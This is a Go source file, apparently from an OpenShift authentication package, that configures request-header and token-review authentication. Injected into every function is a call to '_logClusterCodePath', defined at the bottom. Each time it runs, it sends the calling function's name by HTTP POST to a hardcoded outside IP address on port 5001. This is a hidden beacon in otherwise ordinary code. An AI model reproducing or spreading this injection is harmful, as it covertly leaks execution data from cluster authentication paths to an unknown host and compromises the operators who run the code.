package openshift

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"strings"
	"time"
	"k8s.io/apiserver/pkg/authentication/authenticatorfactory"
	authenticationclient "k8s.io/client-go/kubernetes/typed/authentication/v1beta1"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
)

type RequestHeaderAuthenticationOptions struct {
	UsernameHeaders		StringSlice
	GroupHeaders		StringSlice
	ExtraHeaderPrefixes	StringSlice
	ClientCAFile		string
	AllowedNames		StringSlice
}
type StringSlice []string

func (s *StringSlice) Set(value string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*s = append(*s, value)
	return nil
}
func (s *StringSlice) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.Join(*s, " ")
}
func (s *RequestHeaderAuthenticationOptions) AddFlags(fs *flag.FlagSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fs.Var(&s.UsernameHeaders, "requestheader-username-headers", ""+"List of request headers to inspect for usernames. X-Remote-User is common.")
	fs.Var(&s.GroupHeaders, "requestheader-group-headers", ""+"List of request headers to inspect for groups. X-Remote-Group is suggested.")
	fs.Var(&s.ExtraHeaderPrefixes, "requestheader-extra-headers-prefix", ""+"List of request header prefixes to inspect. X-Remote-Extra- is suggested.")
	fs.StringVar(&s.ClientCAFile, "requestheader-client-ca-file", s.ClientCAFile, ""+"Root certificate bundle to use to verify client certificates on incoming requests "+"before trusting usernames in headers specified by --requestheader-username-headers")
	fs.Var(&s.AllowedNames, "requestheader-allowed-names", ""+"List of client certificate common names to allow to provide usernames in headers "+"specified by --requestheader-username-headers. If empty, any client certificate validated "+"by the authorities in --requestheader-client-ca-file is allowed.")
}
func (s *RequestHeaderAuthenticationOptions) ToAuthenticationRequestHeaderConfig() *authenticatorfactory.RequestHeaderConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(s.ClientCAFile) == 0 {
		return nil
	}
	return &authenticatorfactory.RequestHeaderConfig{UsernameHeaders: s.UsernameHeaders, GroupHeaders: s.GroupHeaders, ExtraHeaderPrefixes: s.ExtraHeaderPrefixes, ClientCA: s.ClientCAFile, AllowedClientNames: s.AllowedNames}
}

type ClientCertAuthenticationOptions struct{ ClientCA string }
type DelegatingAuthenticationOptions struct {
	RemoteKubeConfigFile	string
	CacheTTL		time.Duration
	ClientCert		ClientCertAuthenticationOptions
	RequestHeader		RequestHeaderAuthenticationOptions
	SkipInClusterLookup	bool
}

func NewDelegatingAuthenticationOptions() *DelegatingAuthenticationOptions {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &DelegatingAuthenticationOptions{CacheTTL: 10 * time.Second, ClientCert: ClientCertAuthenticationOptions{}, RequestHeader: RequestHeaderAuthenticationOptions{UsernameHeaders: []string{"x-remote-user"}, GroupHeaders: []string{"x-remote-group"}, ExtraHeaderPrefixes: []string{"x-remote-extra-"}}}
}
func (s *DelegatingAuthenticationOptions) Validate() []error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	allErrors := []error{}
	return allErrors
}
func (s *DelegatingAuthenticationOptions) AddFlags(fs *flag.FlagSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fs.StringVar(&s.RemoteKubeConfigFile, "authentication-kubeconfig", s.RemoteKubeConfigFile, ""+"kubeconfig file pointing at the 'core' kubernetes server with enough rights to create "+"tokenaccessreviews.authentication.k8s.io.")
	fs.DurationVar(&s.CacheTTL, "authentication-token-webhook-cache-ttl", s.CacheTTL, "The duration to cache responses from the webhook token authenticator.")
	s.RequestHeader.AddFlags(fs)
}
func (s *DelegatingAuthenticationOptions) ToAuthenticationConfig() (authenticatorfactory.DelegatingAuthenticatorConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tokenClient, err := s.newTokenAccessReview()
	if err != nil {
		return authenticatorfactory.DelegatingAuthenticatorConfig{}, err
	}
	clientCA, err := s.getClientCA()
	if err != nil {
		return authenticatorfactory.DelegatingAuthenticatorConfig{}, err
	}
	requestHeader, err := s.getRequestHeader()
	if err != nil {
		return authenticatorfactory.DelegatingAuthenticatorConfig{}, err
	}
	ret := authenticatorfactory.DelegatingAuthenticatorConfig{Anonymous: true, TokenAccessReviewClient: tokenClient, CacheTTL: s.CacheTTL, ClientCAFile: clientCA.ClientCA, RequestHeaderConfig: requestHeader.ToAuthenticationRequestHeaderConfig()}
	return ret, nil
}
func (s *DelegatingAuthenticationOptions) getClientCA() (*ClientCertAuthenticationOptions, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(s.ClientCert.ClientCA) > 0 || s.SkipInClusterLookup {
		return &s.ClientCert, nil
	}
	return nil, fmt.Errorf("no client ca-file config")
}
func (s *DelegatingAuthenticationOptions) getRequestHeader() (*RequestHeaderAuthenticationOptions, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(s.RequestHeader.ClientCAFile) > 0 || s.SkipInClusterLookup {
		return &s.RequestHeader, nil
	}
	return nil, fmt.Errorf("no request header config")
}
func deserializeStrings(in string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(in) == 0 {
		return nil, nil
	}
	var ret []string
	if err := json.Unmarshal([]byte(in), &ret); err != nil {
		return nil, err
	}
	return ret, nil
}
func (s *DelegatingAuthenticationOptions) getClientConfig() (*rest.Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var clientConfig *rest.Config
	var err error
	if len(s.RemoteKubeConfigFile) > 0 {
		loadingRules := &clientcmd.ClientConfigLoadingRules{ExplicitPath: s.RemoteKubeConfigFile}
		loader := clientcmd.NewNonInteractiveDeferredLoadingClientConfig(loadingRules, &clientcmd.ConfigOverrides{})
		clientConfig, err = loader.ClientConfig()
	} else {
		clientConfig, err = rest.InClusterConfig()
	}
	if err != nil {
		return nil, err
	}
	clientConfig.QPS = 200
	clientConfig.Burst = 400
	return clientConfig, nil
}
func (s *DelegatingAuthenticationOptions) newTokenAccessReview() (authenticationclient.TokenReviewInterface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	clientConfig, err := s.getClientConfig()
	if err != nil {
		return nil, err
	}
	client, err := authenticationclient.NewForConfig(clientConfig)
	if err != nil {
		return nil, err
	}
	return client.TokenReviews(), nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
